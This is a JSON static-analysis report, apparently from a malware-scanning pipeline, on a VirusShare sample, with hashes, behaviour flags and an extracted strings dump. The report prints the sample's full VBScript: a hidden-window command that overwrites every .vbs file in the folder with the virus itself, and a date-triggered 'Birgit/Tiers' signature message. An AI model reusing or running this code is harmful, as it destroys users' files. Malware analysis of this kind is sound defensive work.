@@ -1,0 +1,43 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Chr": "May attempt to obfuscate specific str",
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "Wscript.Shell": "May run an executable file or a system command",
+            "vbHide": "May run an executable file or a system command"
+        },
+        "macro": "Set WshShell = Wscript.CreateObject(\"Wscript.Shell\")\n\nWshShell.Run (CommandPath & \" /c for %%a in (*.vbs) do move /y \" & Wscript.ScriptFullName & \" %%a >nul\"), vbHide\n\nIf Day(Now()) = 19 Then\n\nWScript.Echo \"Birgit\" & Chr(19) & \"by Birgit/Tiers\"\n\nEnd If"
+    },
+    "filename": "VirusShare_32809b82495dafb8b8d65fdfe8ad195c",
+    "filesize": 262,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "32809b82495dafb8b8d65fdfe8ad195c",
+        "sha1": "22ec83a2b9dc9c62aedbf38dd2e7c062f9ae162a",
+        "sha256": "4d9829767b61411c899b3b4027e7b0c0f8d892d317f654aa61a6f66c6eb55cc4"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Set WshShell = Wscript.CreateObject(\"Wscript.Shell\")",
+            "WshShell.Run (CommandPath & \" /c for %%a in (*.vbs) do move /y \" & Wscript.ScriptFullName & \" %%a >nul\"), vbHide",
+            "If Day(Now()) = 19 Then",
+            "WScript.Echo \"Birgit\" & Chr(19) & \"by Birgit/Tiers\"",
+            "End If"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.257667",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
